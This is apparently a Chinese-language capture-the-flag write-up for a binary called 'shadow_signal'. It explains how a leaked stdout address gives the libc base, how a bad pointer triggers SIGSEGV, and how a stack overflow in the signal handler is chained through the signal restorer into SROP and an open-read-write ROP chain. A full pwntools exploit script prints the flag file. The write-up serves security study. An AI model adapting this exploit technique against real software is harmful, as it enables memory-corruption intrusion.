前置知识：

sa_handler 是结构体里的一个字段，用来指定“收到信号后执行哪个函数”。sigemptyset(&act.sa_mask);

sa_mask 表示：当 handler 正在执行时，临时屏蔽哪些信号。

act.sa_handler = handler 是什么意思？

sa_handler 是结构体里的一个字段，用来指定“收到信号后执行哪个函数”。

sigemptyset，就是把集合清空：

不额外屏蔽其他信号

sa_handler：

act.sa_handler = (__sighandler_t)handler;

意思是配置“信号来了以后调用哪个函数”。

Linux 处理信号时，会在用户栈上布置一个信号帧。这个信号帧里不只是保存寄存器，还会安排一个“返回地址”。当 signal handler 执行完 ret 时，它不是直接回到原来崩溃指令，而是先回到这个 restorer。

这道题主要用到的方法

shellcode，srop，orw

这里的保护不过多赘述了

然后放入ida查看

发现有gift 这里打印出来的是stdout偏移后的地址

这里也就相当于给了libc基址了

然后可以构造一下

r.recvuntil(b"gift: ")
leak = int(r.recvline().strip(), 16)
libc_base = leak - libc.sym["_IO_2_1_stdout_"]

为什么减 _IO_2_1_stdout_？因为打印出来的 stdout 实际指向 **libc 里的 FILE 结构 _IO_2_1_stdout_。**泄露值是：

libc_base + libc.sym["_IO_2_1_stdout_"]

所以反过来：

libc_base = leak - _IO_2_1_stdout_

有了libc基址之后我们就可以进行利用所有的libc gadget read syscall；ret

后面的

read(0, &buf, 8u);
puts(buf);

这里主要输入一个错误地址，然后puts进行取地址的时候触发段错误

11 = SIGSEGV = 段错误

之后触发段错误之后

sigaction(sig, act, oldact) 的意思是：给某个信号注册处理函数。

当程序收到 SIGSEGV 时，调用 handler

程序会去handler里面

在handler里面可以看到明显的栈溢出

但是后面的if函数 这里的意思是如果返回地址被覆盖就结束程序

所以我们要把返回地址填进去

handler 的返回地址指向 libc 里的 signal restorer 代码
而这个 restorer 代码里面有 syscall 也就是说，栈上的返回地址是一个地址值

这里可以在gdb中进行调试查看 当遇到段错误停下时可以输入下面的这个

handle SIGSEGV nostop noprint pass

含义：

nostop  GDB 不在 SIGSEGV 停下
noprint 不打印 SIGSEGV 信息
pass    把 SIGSEGV 传递给程序

然后下断点查看返回地址

这里通过泄露libc基址可以知道这个返回地址的偏移0x42520

然后内核根据fake frame 恢复寄存器 这时候我们需要把rsp切换到bss段

完整的exp

#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.log_level = "info"
#context.terminal = ["tmux","splitw","-h"]

elf = ELF("./shadow_signal")
libc = ELF("./libc.so.6")

r = process(["./ld-linux-x86-64.so.2", "--library-path", ".", "./shadow_signal"])

r.recvuntil(b"gift: ")
leak = int(r.recvline().strip(), 16)
libc_base = leak - libc.sym["_IO_2_1_stdout_"]

log.success("stdout leak = " + hex(leak))
log.success("libc base   = " + hex(libc_base))

#gdb.attach(r)

bss = 0x406000
restorer = libc_base + 0x42520
read_addr = libc_base + libc.sym["read"]

pop_rdi = libc_base + 0x2a3e5
pop_rsi = libc_base + 0x2be51
pop_rdx_rbx = libc_base + 0x904a9
pop_rax = libc_base + 0x45eb0
syscall_ret = libc_base + 0x91316

path = b"./flag"
path_addr = bss + 0x300
flag_buf = bss + 0x380

r.send(p64(0xdeadbeef))
r.recvuntil(b"signal\n")

frame = SigreturnFrame(kernel="amd64")
frame.rdi = 0
frame.rsi = bss
frame.rdx = 0x500
frame.rsp = bss
frame.rip = read_addr

payload = b"A" * 0x118
payload += p64(restorer)
payload += bytes(frame)

r.send(payload)
sleep(0.05)

rop = flat(
    pop_rax, 2,
    pop_rdi, path_addr,
    pop_rsi, 0,
    pop_rdx_rbx, 0, 0,
    syscall_ret,

    pop_rax, 0,
    pop_rdi, 3,
    pop_rsi, flag_buf,
    pop_rdx_rbx, 0x100, 0,
    syscall_ret,

    pop_rax, 1,
    pop_rdi, 1,
    pop_rsi, flag_buf,
    pop_rdx_rbx, 0x100, 0,
    syscall_ret,
)

payload2 = rop.ljust(0x300, b"\x00")
payload2 += path
payload2 += b"\x00"

r.send(payload2)

data = r.recv(timeout=2)
print(data.rstrip(b"\x00").decode("latin-1", "replace"))

r.interactive()

如果要修改flag的位置可以修改path = b”./flag”
